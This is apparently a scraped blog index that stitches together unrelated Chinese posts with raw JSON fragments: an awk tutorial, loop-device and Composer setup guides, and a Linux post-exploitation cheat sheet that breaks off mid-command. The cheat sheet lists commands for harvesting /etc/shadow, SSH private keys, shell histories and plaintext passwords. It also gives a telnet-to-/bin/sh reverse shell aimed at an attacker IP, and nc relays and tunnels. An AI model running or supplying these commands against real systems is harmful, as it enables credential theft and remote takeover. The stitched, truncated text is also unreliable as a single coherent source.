依次对每一行进行处理，然后输出\r\nawk命令形式:\r\nawk [-F|-f|-v] ‘BEGIN{} //{command1; command2} END{}’ file\r\n [-F|-f|-v]   大参数，-F指定分隔符，-f调用脚本，-v定义变量 var=value\r\n'  '          引用代码块\r\nBEGIN   初始化代码块，在对每一行进行处理之前，初始化代码，主要是引用全局变量，设置FS分隔符\r\n//           匹配代码块，可以是字符串或正则表达式\r\n{}           命令代码块，包含一条或多条命令\r\n；          多条命令使用分号分隔\r\nEND      结尾代码块，在对每一行进行处理之后再执行的代码块，主要是进行最终计算或输出结尾摘要信息\r\n\r\n特殊要点:\r\n$0          表示整个当前行\r\n$1          每行第一个字段\r\n\r\n-F'[:/]'   定义三个分隔符\r\nNF          [字段数] 量变量              number fields\r\nNR          [行号]   每行的记录号，多文件记录递增 number line  \r\nFNR         与NR类似，不过多文件记录不递增，每个文件都从1开始\r\nFS          BEGIN时定义分隔符输入分隔符 默认空白\r\nRS          输入的记录分隔符， 默认为换行符(即文本是按一行一行输入)\r\n\r\n-v OFS='|' 指定输出分隔符为|\r\nOFS         输出字段分隔符， 默认也是空格，可以改为制表符等\r\nORS        输出的记录分隔符，默认为换行符,即处理结果也是一行一行输出到屏幕\r\n\r\n\\t          制表符\r\n\\n          换行符\r\n~           匹配，与==相比不是精确比较\r\n!~          不匹配，不精确比较\r\n          等于，必须全部相等，精确比较\r\n!=          不等于，精确比较\r\n\u0026\u0026　        逻辑与\r\n||          逻辑或\r\n匹配时表示1个或1个以上\r\n/0-9+/   两个或两个以上数字\r\n/0-9 /    一个或一个以上数字\r\nFILENAME 文件名\r\n\r\n\r\n参考链接：http://man.linuxde.net/awk\r\n    awk是一种编程语言，用于在linux/unix下对文本和数据进行处理。数据可以来自标准输入(stdin)、一个或多个文件，\r\n或其它命令的输出。它支持用户自定义函数和动态正则表达式等先进功能，是linux/unix下的一个强大编程工具。它在命令行\r\n中使用，但更多是作为脚本来使用。awk有很多内建的功能，比如数组、函数等，这是它和C语言的相同之处，灵活性是awk最大的优势。\r\n\r\n语法：\r\n    awk [options] 'script' var=value file(s)\r\n    awk [options] -f scriptfile var=value file(s)\r\n选项：\r\n    -F fs   fs指定输入分隔符，fs可以是字符串或正则表达式，如-F:\r\n    -v var=value   赋值一个用户定义变量，将外部变量传递给awk\r\n    -f scripfile  从脚本文件中读取awk命令 -m[fr] val   对val值设置内在限制，\r\n    -mf选项限制分配给val的最大块数目；-mr选项限制记录的最大数目。这两个功能是Bell实验室版awk的扩展功能，在标准awk中不适用。\r\n\r\nawk模式和操作：\r\n    模式\r\n    模式可以是以下任意一个：\r\n        /正则表达式/：使用通配符的扩展集。\r\n        关系表达式：使用运算符进行操作，可以是字符串或数字的比较测试。\r\n        模式匹配表达式：用运算符~（匹配）和~!（不匹配）。\r\n        BEGIN语句块、pattern语句块、END语句块：参见awk的工作原理\r\n\r\n    操作：\r\n    操作由一个或多个命令、函数、表达式组成，之间由换行符或分号隔开，并位于大括号内，主要部分是：\r\n        变量或数组赋值\r\n        输出命令\r\n        内置函数\r\n        控制流语句\r\n\r\nawk脚本基本结构\r\n    awk 'BEGIN{ print \"start\" } pattern{ commands } END{ print \"end\" }' file\r\n    一个awk脚本通常由：BEGIN语句块、能够使用模式匹配的通用语句块、END语句块3部分组成，这三个部分是可选的。\r\n任意一个部分都可以不出现在脚本中，脚本通常是被单引号或双引号中，\r\n例如： awk 'BEGIN{ i=0 } { i++ } END{ print i }' filename awk \"BEGIN{ i=0 } { i++ } END{ print i }\" filename\r\nawk的工作原理\r\n    awk 'BEGIN{ commands } pattern{ commands } END{ commands }'\r\n    1、执行BEGIN{ commands }语句块中的语句；\r\n    2、从文件或标准输入(stdin)读取一行，然后执行pattern{ commands }语句块，它逐行扫描文件，从第一行到\r\n        最后一行重复这个过程，直到文件全部被读取完毕。\r\n    3、当读至输入流末尾时，执行END{ commands }语句块。\r\n    BEGIN语句块在awk开始从输入流中读取行之前被执行，这是一个可选的语句块，比如变量初始化、打印输出表格的表头等\r\n        语句通常可以写在BEGIN语句块中。\r\n    END语句块在awk从输入流中读取完所有的行之后即被执行，比如打印所有行的分析结果这类信息汇总都是在END语句块中\r\n        完成，它也是一个可选语句块。\r\n    pattern语句块中的通用命令是最重要的部分，它也是可选的。如果没有提供pattern语句块，则默认执行{ print }，即\r\n        打印每一个读取到的行，awk读取的每一行都会执行该语句块。\r\n    示例：\r\n        1)打印当前行\r\n\t\t\tshell  echo -e \"A line 1\\nA line 2\" | awk 'BEGIN{ print \"Start\" } { print } END{ print \"End\" }'\r\n\t\t\tStart\r\n\t\t\tA line 1\r\n\t\t\tA line 2\r\n\t\t\tEnd\r\n\t\t\t当使用不带参数的print时，它就打印当前行，当print的参数是以逗号进行分隔时，打印时则以空格作为定界符。\r\n\t\t\t在awk的print语句块中双引号是被当作拼接符使用，\r\n\t\t2)参数已逗号分隔\r\n\t\t\tshell  echo | awk '{ var1=\"v1\"; var2=\"v2\"; var3=\"v3\"; print var1,var2,var3; }'\r\n\t\t\tv1 v2 v3\r\n        3)双引号拼接使用\r\n\t\t\tshell  echo | awk '{ var1=\"v1\"; var2=\"v2\"; var3=\"v3\"; print var1\"=\"var2\"=\"var3; }'\r\n\t\t\tv1=v2=v3\r\n        { }类似一个循环体，会对文件中的每一行进行迭代，通常变量初始化语句（如：i=0）以及打印文件头部的语句放入\r\n            BEGIN语句块中，将打印的结果等语句放在END语句块中。\r\nawk内置变量（预定义变量）:\r\n    说明：AP表示第一个支持变量的工具，[A]=awk、[N]=nawk、[P]=POSIXawk、[G]=gawk\r\n    $n 当前记录的第n个字段，比如n为1表示第一个字段，n为2表示第二个字段。\r\n    $0 这个变量包含执行过程中当前行的文本内容。\r\n    [N] ARGC 命令行参数的数目。\r\n    [G] ARGIND 命令行中当前文件的位置（从0开始算）。\r\n    [N] ARGV 包含命令行参数的数组。\r\n    [G] CONVFMT 数字转换格式（默认值为%.6g）。\r\n    [P] ENVIRON 环境变量关联数组。\r\n    [N] ERRNO 最后一个系统错误的描述。\r\n    [G] FIELDWIDTHS 字段宽度列表（用空格键分隔）。\r\n    [A] FILENAME 当前输入文件的名。\r\n    [P] FNR 同NR，但相对于当前文件。\r\n    [A] FS 字段分隔符（默认是任何空格）。\r\n    [G] IGNORECASE 如果为真，则进行忽略大小写的匹配。\r\n    [A] NF 表示字段数，在执行过程中对应于当前的字段数。\r\n    [A] NR 表示记录数，在执行过程中对应于当前的行号。\r\n    [A] OFMT 数字的输出格式（默认值是%.6g）。\r\n    [A] OFS 输出字段分隔符（默认值是一个空格）。\r\n    [A] ORS 输出记录分隔符（默认值是一个换行符）。\r\n    [A] RS 记录分隔符（默认是一个换行符）。\r\n    [N] RSTART 由match函数所匹配的字符串的第一个位置。\r\n    [N] RLENGTH 由match函数所匹配的字符串的长度。\r\n    [N] SUBSEP 数组下标分隔符（默认值是34）。\r\n\t示例：\r\n\t1)NR NF使用\r\n\t\tshell  echo -e \"line1 f2 f3nline2 f4 f5nline3 f6 f7\" | awk '{print \"Line No:\"NR\", No of fields:\"NF, \"$0=\"$0, \"$1=\"$1, \"$2=\"$2, \"$3=\"$3}'\r\n\t\tLine No:1, No of fields:3 $0=line1 f2 f3 $1=line1 $2=f2 $3=f3\r\n\t\tLine No:2, No of fields:3 $0=line2 f4 f5 $1=line2 $2=f4 $3=f5\r\n\t\tLine No:3, No of fields:3 $0=line3 f6 f7 $1=line3 $2=f6 $3=f7\r\n\t2)使用print $NF可以打印出一行中的最后一个字段，使用$(NF-1)则是打印倒数第二个字段，其他以此类推：\r\n\t\tshell  echo -e \"line1 f2 f3n line2 f4 f5\" | awk '{print $NF}'\r\n\t\tf3 f5\r\n\t\tshell  echo -e \"line1 f2 f3n line2 f4 f5\" | awk '{print $(NF-1)}'\r\n\t\tf2 f4\r\n\t3)打印每一行的第二和第三个字段：\r\n\t\tshell  awk '{ print $2,$3 }' filename\r\n\t4)统计文件中的行数：\r\n\t\tshell  awk 'END{ print NR }' filename\r\n\t\t以上命令只使用了END语句块，在读入每一行的时，awk会将NR更新为对应的行号，当到达最后一行NR的值就是最后一行的行号，所以END语句块中的NR就是文件的行数。\r\n\t5)一个每一行中第一个字段值累加\r\n\t\tshell  seq 5 | awk 'BEGIN{ sum=0; print \"总和：\" } { print $1\"+\"; sum+=$1 } END{ print \"等于\"; print sum }'\r\n\t\t总和： 1+ 2+ 3+ 4+ 5+ 等于 15\r\n将外部变量值传递给awk\r\n\t1)借助-v选项，可以将外部值（并非来自stdin）传递给awk\r\n\t\tshell  VAR=1000; echo | awk -v variable=$VAR '{print variable}'\r\n\t2)另一种传递外部变量方法\r\n\t\tshell  var1=\"aaa\"; var2=\"bbb\"; echo | awk '{print v1, v2}' v1=$var1 v2=$var2\r\n\t\t注：=表示赋值时，前后不要加空格\r\n\t3)当输入来自于文件时使用\r\n\t\tshell  awk '{ print v1,v2 }' v1=$var1 v2=$var2 filename\r\n\t以上方法中，变量之间用空格分隔作为awk的命令行参数跟随在BEGIN、{}和END语句块之后。\r\nawk运算与判断\r\n\t未完，待续\r\n\r\n\r\nprint \u0026 $0\r\nprint 是awk打印指定内容的主要命令\r\nawk '{print}'  /etc/passwd   ==   awk '{print $0}'  /etc/passwd  \r\nawk '{print \" \"}' /etc/passwd                                           //不输出passwd的内容，而是输出相同个数的空行，进一步解释了awk是一行一行处理文本\r\nawk '{print \"a\"}'   /etc/passwd                                        //输出相同个数的a行，一行只有一个a字母\r\nawk -F\":\" '{print $1}'  /etc/passwd\r\nawk -F: '{print $1; print $2}'   /etc/passwd                   //将每一行的前二个字段，分行输出，进一步理解一行一行处理文本\r\nawk  -F: '{print $1,$3,$6}' OFS=\"\\t\" /etc/passwd        //输出字段1,3,6，以制表符作为分隔符\r\n\r\n-f指定脚本文件\r\nawk -f script.awk  file\r\nBEGIN{\r\nFS=\":\"\r\n}\r\n{print $1}               //效果与awk -F\":\" '{print $1}'相同,只是分隔符使用FS在代码自身中指定\r\n\r\nawk 'BEGIN{X=0} /^$/{ X+=1 } END{print \"I find\",X,\"blank lines.\"}' test\r\nI find 4 blank lines.\r\n ls -l|awk 'BEGIN{sum=0} !/^d/{sum+=$5} END{print \"total size is\",sum}'                    //计算文件大小\r\ntotal size is 17487\r\n\r\n-F指定分隔符\r\n$1 指指定分隔符后，第一个字段，$3第三个字段， \\t是制表符\r\n一个或多个连续的空格或制表符看做一个定界符，即多个空格看做一个空格\r\nawk -F\":\" '{print $1}'  /etc/passwd\r\nawk -F\":\" '{print $1 $3}'  /etc/passwd                       //$1与$3相连输出，不分隔\r\nawk -F\":\" '{print $1,$3}'  /etc/passwd                       //多了一个逗号，$1与$3使用空格分隔\r\nawk -F\":\" '{print $1 \" \" $3}'  /etc/passwd                  //$1与$3之间手动添加空格分隔\r\nawk -F\":\" '{print \"Username:\" $1 \"\\t\\t Uid:\" $3 }' /etc/passwd       //自定义输出  \r\nawk -F: '{print NF}' /etc/passwd                                //显示每行有多少字段\r\nawk -F: '{print $NF}' /etc/passwd                              //将每行第NF个字段的值打印出来\r\n awk -F: 'NF==4 {print }' /etc/passwd                       //显示只有4个字段的行\r\nawk -F: 'NF  2{print $0}' /etc/passwd                       //显示每行字段数量大于2的行\r\nawk '{print NR,$0}' /etc/passwd                                 //输出每行的行号\r\nawk -F: '{print NR,NF,$NF,\"\\t\",$0}' /etc/passwd      //依次打印行号，字段数，最后字段值，制表符，每行内容\r\nawk -F: 'NR==5{print}'  /etc/passwd                         //显示第5行\r\nawk -F: 'NR==5 || NR==6{print}'  /etc/passwd       //显示第5行和第6行\r\nroute -n|awk 'NR!=1{print}'                                       //不显示第一行\r\n\r\n//匹配代码块\r\n//纯字符匹配   !//纯字符不匹配   ~//字段值匹配    !~//字段值不匹配   ~/a1|a2/字段值匹配a1或a2   \r\nawk '/mysql/' /etc/passwd\r\nawk '/mysql/{print }' /etc/passwd\r\nawk '/mysql/{print $0}' /etc/passwd                   //三条指令结果一样\r\nawk '!/mysql/{print $0}' /etc/passwd                  //输出不匹配mysql的行\r\nawk '/mysql|mail/{print}' /etc/passwd\r\nawk '!/mysql|mail/{print}' /etc/passwd\r\nawk -F: '/mail/,/mysql/{print}' /etc/passwd         //区间匹配\r\nawk '/2[7]/{print $0}' /etc/passwd               //匹配包含27为数字开头的行，如27，277，2777...\r\nawk -F: '$1~/mail/{print $1}' /etc/passwd           //$1匹配指定内容才显示\r\nawk -F: '{if($1~/mail/) print $1}' /etc/passwd     //与上面相同\r\nawk -F: '$1!~/mail/{print $1}' /etc/passwd          //不匹配\r\nawk -F: '$1!~/mail|mysql/{print $1}' /etc/passwd        \r\n\r\nIF语句\r\n必须用在{}中，且比较内容用()扩起来\r\nawk -F: '{if($1~/mail/) print $1}' /etc/passwd                                       //简写\r\nawk -F: '{if($1~/mail/) {print $1}}'  /etc/passwd                                   //全写\r\nawk -F: '{if($1~/mail/) {print $1} else {print $2}}' /etc/passwd            //if...else...\r\n\r\n\r\n条件表达式\r\n   !=       =  \r\nawk -F\":\" '$1==\"mysql\"{print $3}' /etc/passwd  \r\nawk -F\":\" '{if($1==\"mysql\") print $3}' /etc/passwd          //与上面相同\r\nawk -F\":\" '$1!=\"mysql\"{print $3}' /etc/passwd                 //不等于\r\nawk -F\":\" '$3  1000{print $3}' /etc/passwd                      //大于\r\nawk -F\":\" '$3  =100{print $3}' /etc/passwd                     //大于等于\r\nawk -F\":\" '$3\u003c1{print $3}' /etc/passwd                            //小于\r\nawk -F\":\" '$3\u003c=1{print $3}' /etc/passwd                         //小于等于\r\n\r\n逻辑运算符\r\n\u0026\u0026　||\r\nawk -F: '$1~/mail/ \u0026\u0026 $3  8 {print }' /etc/passwd         //逻辑与，$1匹配mail，并且$3  8\r\nawk -F: '{if($1~/mail/ \u0026\u0026 $3  8) print }' /etc/passwd\r\nawk -F: '$1~/mail/ || $3  1000 {print }' /etc/passwd       //逻辑或\r\nawk -F: '{if($1~/mail/ || $3  1000) print }' /etc/passwd\r\n\r\n数值运算\r\nawk -F: '$3   100' /etc/passwd    \r\nawk -F: '$3   100 || $3 \u003c 5' /etc/passwd  \r\nawk -F: '$3+$4   200' /etc/passwd\r\nawk -F: '/mysql|mail/{print $3+10}' /etc/passwd                    //第三个字段加10打印\r\nawk -F: '/mysql/{print $3-$4}' /etc/passwd                             //减法\r\nawk -F: '/mysql/{print $3$4}' /etc/passwd                             //求乘积\r\nawk '/MemFree/{print $2/1024}' /proc/meminfo                  //除法\r\nawk '/MemFree/{print int($2/1024)}' /proc/meminfo           //取整\r\n\r\n输出分隔符OFS\r\nawk '$6 ~ /FIN/ || NR==1 {print NR,$4,$5,$6}' OFS=\"\\t\" netstat.txt\r\nawk '$6 ~ /WAIT/ || NR==1 {print NR,$4,$5,$6}' OFS=\"\\t\" netstat.txt        \r\n//输出字段6匹配WAIT的行，其中输出每行行号，字段4，5,6，并使用制表符分割字段\r\n\r\n输出处理结果到文件\r\n①在命令代码块中直接输出    route -n|awk 'NR!=1{print   \"./fs\"}'   \r\n②使用重定向进行输出           route -n|awk 'NR!=1{print}'    ./fs\r\n\r\n格式化输出\r\nnetstat -anp|awk '{printf \"%-8s %-8s %-10s\\n\",$1,$2,$3}'\r\nprintf表示格式输出\r\n%格式化输出分隔符\r\n-8长度为8个字符\r\ns表示字符串类型\r\n打印每行前三个字段，指定第一个字段输出字符串类型(长度为8)，第二个字段输出字符串类型(长度为8),\r\n第三个字段输出字符串类型(长度为10)\r\nnetstat -anp|awk '$6==\"LISTEN\" || NR==1 {printf \"%-10s %-10s %-10s \\n\",$1,$2,$3}'\r\nnetstat -anp|awk '$6==\"LISTEN\" || NR==1 {printf \"%-3s %-10s %-10s %-10s \\n\",NR,$1,$2,$3}'\r\n\r\nIF语句\r\nawk -F: '{if($3  100) print \"large\"; else print \"small\"}' /etc/passwd\r\nsmall\r\nsmall\r\nsmall\r\nlarge\r\nsmall\r\nsmall\r\nawk -F: 'BEGIN{A=0;B=0} {if($3  100) {A++; print \"large\"} else {B++; print \"small\"}} END{print A,\"\\t\",B}' /etc/passwd\r\n                                                                                                                  //ID大于100,A加1，否则B加1\r\nawk -F: '{if($3\u003c100) next; else print}' /etc/passwd                         //小于100跳过，否则显示\r\nawk -F: 'BEGIN{i=1} {if(i","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 loop设备","title":"Linux命令 loop","text":"loop设备介绍\n   在类 UNIX 系统里，loop 设备是一种伪设备(pseudo-device)，或者也可以说是仿真设备。它能使我们像块设备一样访问一个文件。\n在使用之前，一个 loop 设备必须要和一个文件进行连接。这种结合方式给用户提供了一个替代块特殊文件的接口。因此，如果这个文件包含有一个完整的文件系统，那么这个文件就可以像一个磁盘设备一样被 mount 起来。\n   上面说的文件格式，我们经常见到的是 CD 或 DVD 的 ISO 光盘镜像文件或者是软盘(硬盘)的 * .img 镜像文件。通过这种 loop mount (回环mount)的方式，这些镜像文件就可以被 mount 到当前文件系统的一个目录下。\n   至此，顺便可以再理解一下 loop 之含义：对于第一层文件系统，它直接安装在我们计算机的物理设备之上；而对于这种被 mount 起来的镜像文件(它也包含有文件系统)，它是建立在第一层文件系统之上，这样看来，它就像是在第一层文件系统之上再绕了一圈的文件系统，所以称为 loop。\n1.创建一个100M大小的映像文件\ndd if=/dev/zero of=test.img bs=10m count=100\n2.查找空闲的loop设备\nlosetup -f\n3.将映像文件挂接到loop4中。\nlosetup /dev/loop4 test.img\n4.对loop4进行分区\nfdisk /dev/loo4\nspacer.gif223212936.png\n5.使用kpartx将分区装载到映像文件中\nkpartx -av test.img\n6.格式化分区\nmkfs.ext4 /dev/loo4p1\n这时，我们已经可以在/dev/mapper下看到loop4的映射，然后挂载之：\nmount /dev/mapper/loo4p1 /mnt\n\n卸载：\numount /mnt\nkpartx -dv /dev/loop4\nlosetup -d /dev/loop4\n如果挂载的映像文件，本身有分区，通过空间的loop设备挂接以后，可通过kpartx -av直接进行装载。\nlosetup -f\nlosetup /dev/loop4 test.img\nkpartx -av /dev/loop4\nmount /dev/loop4p1 /mnt","tags":null},{"location":"//blog.pytool.com/Post/基础/2017-04-18 RESTful","title":"RESTful API 编写指南","text":"RESTful API 编写指南\nRESTful 架构风格概述","tags":null},{"location":"//blog.pytool.com/cmd/2016-03-29 linux命令 composer","title":"Linux命令 Composer","text":"install\nPackagist 镜像\n\n请各位使用本镜像的同学注意：\n\n本镜像已经依照 composer 官方的数据源安全策略完全升级并支持 https 协议！请各位同学 按照下面所示的两个方法将 http://packagist.phpcomposer.com 修改为 https://packagist.phpcomposer.com\n\n    还没安装 Composer 吗？请往下看如何安装 Composer 。\n\n用法：\n\n有两种方式启用本镜像服务：\n\n    系统全局配置： 即将配置信息添加到 Composer 的全局配置文件 config.json 中。见“例1”\n    单个项目配置： 将配置信息添加到某个项目的 composer.json 文件中。见“例2”\n\n例1：修改 composer 的全局配置文件（推荐方式）\n\n打开命令行窗口（windows用户）或控制台（Linux、Mac 用户）并执行如下命令：\n\n` composer config -g repo.packagist composer https://packagist.phpcomposer.com\n`\n例2：修改当前项目的 composer.json 配置文件：\n\n打开命令行窗口（windows用户）或控制台（Linux、Mac 用户），进入你的项目的根目录（也就是 composer.json 文件所在目录），执行如下命令：\n\ncomposer config repo.packagist composer https://packagist.phpcomposer.com\n\n上述命令将会在当前项目中的 composer.json 文件的末尾自动添加镜像的配置信息（你也可以自己手工添加）：\n\n\"repositories\": {\n    \"packagist\": {\n        \"type\": \"composer\",\n        \"url\": \"https://packagist.phpcomposer.com\"\n    }\n}\n\n以 laravel 项目的 composer.json 配置文件为例，执行上述命令后如下所示（注意最后几行）：\n\n{\n    \"name\": \"laravel/laravel\",\n    \"description\": \"The Laravel Framework.\",\n    \"keywords\": [\"framework\", \"laravel\"],\n    \"license\": \"MIT\",\n    \"type\": \"project\",\n    \"config\": {\n        \"preferred-install\": \"dist\"\n    },\n    \"repositories\": {\n        \"packagist\": {\n            \"type\": \"composer\",\n            \"url\": \"https://packagist.phpcomposer.com\"\n        }\n    }\n}\n\nOK，一切搞定！试一下 composer install 来体验飞一般的速度吧！\n\n安装composer\nsudo apt install composer --no-install-recommends\ncurl -sS https://getcomposer.org/installer | php\nphp -r \"readfile('https://getcomposer.org/installer');\" | php\n\ncurl -sS https://getcomposer.org/installer | php7.0 -- --install-dir=/usr/local/bin --filename=composer\nphp7.0 -r \"readfile('https://getcomposer.org/installer');\" |  php7.0 -- --install-dir /usr/local/bin --filename composer\nphp -r \"copy('https://getcomposer.org/installer', 'composer-setup.php');\"\nphp -r \"if (hashfile('SHA384', 'composer-setup.php') === '070854512ef404f16bac87071a6db9fd9721da1684cd4589b1196c3faf71b9a2682e2311b36a5079825e155ac7ce150d') { echo 'Installer verified'; } else { echo 'Installer corrupt'; unlink('composer-setup.php'); } echo PHPEOL;\"\nphp composer-setup.php\nphp -r \"unlink('composer-setup.php');\"\nphp composer.phar install\n\nsudo mv composer.phar /usr/bin/composer\n\nWindows 系统：\n\n    找到并进入 PHP 的安装目录（和你在命令行中执行的 php 指令应该是同一套 PHP）。\n    将 composer.phar 复制到 PHP 的安装目录下面，也就是和 php.exe 在同一级目录。\n    在 PHP 安装目录下新建一个 composer.bat 文件，并将下列代码保存到此文件中。\n\n@php \"%~dp0composer.phar\" %\n\n修改composer Packagist 镜像\ncomposer config -g repo.packagist composer https://packagist.phpcomposer.com\ncomposer config repo.packagist composer https://packagist.phpcomposer.com\n更新composer\ncomposer selfupdate\n\n##########################################################################\n\n安装 Laravel\n/etc/apt/sources.list.d/ondrej-php-70-trusty.list\n  deb http://ppa.launchpad.net/ondrej/php/ubuntu trusty main\n\nsudo apt-get update\nsudo apt-get install php-mbstring\nsudo apt-get install mcrypt php7.0-mcrypt\nsudo apt-get upgrade\n\ncomposer create-project laravel/laravel learnlaravel5\n\ncomposer update\n\ncd public\nphp -S 0.0.0.0:1024\n\n 添加用户\n;\"laravel/framework\": \"5.2. \",\nphp artisan make:auth\n\n添加数据库\n;could not find driver\nsudo apt-get -y install php-mysql\n\n;SQLSTATE[HY000] [1044] Access denied for user 'homestead'@'%' to database 'homestead'\nvim .env\n  DBHOST=127.0.0.1\n  DBPORT=3306\n  DBDATABASE=laravel5\n  DBUSERNAME=root\n  DBPASSWORD=''\nphp artisan config:clear\n\ncreate user homestead;\nset password for homestead = password('secret');","tags":null},{"location":"//blog.pytool.com/Hacker/01_信息搜集/2016-03-29 史上最全Linux提权后获取敏感信息方法 ","title":"史上最全Linux提权后获取敏感信息方法","text":"\nBasic Linux Privilege Escalation\n\n在本文开始之前，我想指出我不是专家。据我所知，在这个庞大的区域,没有一个“神奇”的答案.分享，共享（我的出发点）。下面是一个混合的命令做同样的事情，在不同的地方，或只是一个不同的眼光来看待事物。我知道有更多的“东西”去寻找。这只是一个基本粗略的指南。并不是每一个命令，做好要注重细节.\n\n文中的每行为一条命令，文中有的命令可能在你的主机上敲不出来，因为它可能是在其他版本的linux中所使用的命令。\n\n列举关键点\n\n（Linux）的提权是怎么一回事：\n\n 收集 – 枚举，枚举和一些更多的枚举。\n 过程 – 通过数据排序，分析和确定优先次序。\n 搜索 – 知道搜索什么和在哪里可以找到漏洞代码。\n 适应 – 自定义的漏洞，所以它适合。每个系统的工作并不是每一个漏洞“都固定不变”。\n 尝试 – 做好准备,试验和错误。\n\n系统类型\n\n系统是什么版本?\n\ncat /etc/issue\ncat /etc/-release\n\ncat /etc/lsb-release\ncat /etc/redhat-release\n\n它的内核版本是什么？\nuname -a\ncat /proc/version  \nuname -mrs\nrpm -q kernel\ndmesg | grep Linux\nls /boot | grep vmlinuz\n\n它的环境变量里有些什么？\n\ncat /etc/profile\ncat /etc/bashrc\ncat ~/.bashprofile\ncat ~/.bashrc\ncat ~/.bashlogout\nenv\nset\n\n是否有台打印机？\n\nlpstat -a\n\n应用与服务\n\n正在运行什么服务？什么样的服务具有什么用户权限？\n\nps aux\nps -ef\ntop\ncat /etc/service\n\n哪些服务具有root的权限？这些服务里你看起来那些有漏洞,进行再次检查！\n\nps aux | grep root\nps -ef | grep root\n\n安装了哪些应用程序？他们是什么版本？哪些是当前正在运行的？\n\nls -alh /usr/bin/\nls -alh /sbin/\ndpkg -l\nrpm -qa\nls -alh /var/cache/apt/archivesO\nls -alh /var/cache/yum/\n\nService设置，有任何的错误配置吗？是否有任何（脆弱的）的插件？\n\ncat /etc/syslog.conf\ncat /etc/chttp.conf\ncat /etc/lighttpd.conf\ncat /etc/cups/cupsd.conf\ncat /etc/inetd.conf\ncat /etc/apache2/apache2.conf\ncat /etc/my.conf\ncat /etc/httpd/conf/httpd.conf\ncat /opt/lampp/etc/httpd.conf\nls -aRl /etc/ | awk ‘$1 ~ /^.r./\n\n主机上有哪些工作计划？\n\ncrontab -l\nls -alh /var/spool/cron\nls -al /etc/ | grep cron\nls -al /etc/cron\ncat /etc/cron\ncat /etc/at.allow\ncat /etc/at.deny\ncat /etc/cron.allow\ncat /etc/cron.deny\ncat /etc/crontab\ncat /etc/anacrontab\ncat /var/spool/cron/crontabs/root\n\n主机上可能有哪些纯文本用户名和密码?\n\ngrep -i user [filename]\ngrep -i pass [filename]\ngrep -C 5 \"password\" [filename]\nfind . -name \".php\" -print0 | xargs -0 grep -i -n \"var $password\"   # Joomla\n\n通信与网络\n\nNIC(s)，系统有哪些？它是连接到哪一个网络？\n\n/sbin/ifconfig -a\ncat /etc/network/interfaces\ncat /etc/sysconfig/network\n\n网络配置设置是什么？网络中有什么样的服务器？DHCP服务器？DNS服务器？网关？\n\ncat /etc/resolv.conf\ncat /etc/sysconfig/network\ncat /etc/networks\niptables -L\nhostname\ndnsdomainname\n\n其他用户主机与系统的通信？\n\nlsof -i\nlsof -i :80\ngrep 80 /etc/services\nnetstat -antup\nnetstat -antpx\nnetstat -tulpn\nchkconfig --list\nchkconfig --list | grep 3:on\nlast\nw\n\n缓存？IP和/或MAC地址?\n\narp -e\nroute\n/sbin/route -nee\n\n数据包可能嗅探吗？可以看出什么？监听流量\n\ntcpdump tcp dst [ip] [port] and tcp dst [ip] [port]\ntcpdump tcp dst 192.168.1.7 80 and tcp dst 10.2.2.222 21\n\n你如何get一个shell？你如何与系统进行交互？\n\n http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/\nnc -lvp 4444    # Attacker. 输入 (命令)\nnc -lvp 4445    # Attacker. 输出(结果)\ntelnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # 在目标系统上. 使用 攻击者的IP!\n\n如何端口转发？（端口重定向）\n\nrinetd\n\n http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch\n\nfpipe\n\n FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]\nFPipe.exe -l 80 -r 80 -s 80 192.168.1.7\n\nssh\n\n ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]\nssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port\nssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port\n\nmknod\n\n mknod backpipe p ; nc -l -p [remote port]  backpipe  | nc [local IP] [local port] backpipe\nmknod backpipe p ; nc -l -p 8080  backpipe | nc 10.1.1.251 80 backpipe    # Port Relay\nmknod backpipe p ; nc -l -p 8080 0 \u0026  backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1backpipe    # Proxy (Port 80 to 8080)\n\nmknod\n\nbackpipe p ; nc -l -p 8080 0 \u0026 \u003c backpipe | tee -a inflow | nc\nlocalhost 80 | tee -a outflow \u0026 1  backpipe    # Proxy monitor (Port 80 to 8080)\n\n建立隧道可能吗？本地，远程发送命令\n\nssh -D 127.0.0.1:9050 -N [username]@[ip]\nproxychains ifconfig\n\n秘密信息和用户\n\n你是谁？哪个id登录？谁已经登录？还有谁在这里？谁可以做什么呢？\n\nid\nwho\nw\nlast\ncat /etc/passwd | cut -d:    # List of users\ngrep -v -E \"^#\" /etc/passwd | awk -F: \u0026#039;$3 == 0 { print $1}'   # List of super users\nawk -F: '($3 == \"0\") {print}\u0026#039; /etc/passwd   # List of super users\ncat /etc/sudoers\nsudo -l\n\n可以找到什么敏感文件？\n\ncat /etc/passwd\ncat /etc/group\ncat /etc/shadow\nls -alh /var/mail/\n\n什么有趣的文件在home/directorie（S）里？如果有权限访问\n\nls -ahlR /root/\nls -ahlR /home/\n\n是否有任何密码，脚本，数据库，配置文件或日志文件？密码默认路径和位置\n\ncat /var/apache2/config.inc\ncat /var/lib/mysql/mysql/user.MYD\ncat /root/anaconda-ks.cfg\n\n用户做过什么？是否有任何密码呢？他们有没有编辑什么？\n\ncat ~/.bashhistory\ncat ~/.nanohistory\ncat ~/.atftphistory\ncat ~/.mysqlhistory\ncat ~/.phphistory\n\n可以找到什么样的用户信息\n\ncat ~/.bashrc\ncat ~/.profile\ncat /var/mail/root\ncat /var/spool/mail/root\n\nprivate-key 信息能否被发现？\n\ncat ~/.ssh/authorizedkeys\ncat ~/.ssh/identity.pub\ncat ~/.ssh/identity\ncat ~/.ssh/idrsa.pub\ncat ~/.ssh/idrsa\ncat ~/.ssh/iddsa.pub\ncat ~/.ssh/iddsa\ncat /etc/ssh/sshconfig\ncat /etc/ssh/sshdconfig\ncat /etc/ssh/sshhostdsakey.pub\ncat /etc/ssh/sshhostdsakey\ncat /etc/ssh/sshhostrsakey.pub\ncat /etc/ssh/sshhostrsakey\ncat /etc/ssh/sshhostkey.pub\ncat /etc/ssh/sshhostkey\n\n文件系统\n\n哪些用户可以写配置文件在/ etc /？能够重新配置服务？\n\nls -aRl /etc/ | awk ‘$1 ~ /^.w./' 2  /dev/null     # Anyone\nls -aRl /etc/ | awk ’$1 ~ /^..w/' 2  /dev/null        # Owner\nls -aRl /etc/ | awk ‘$1 ~ 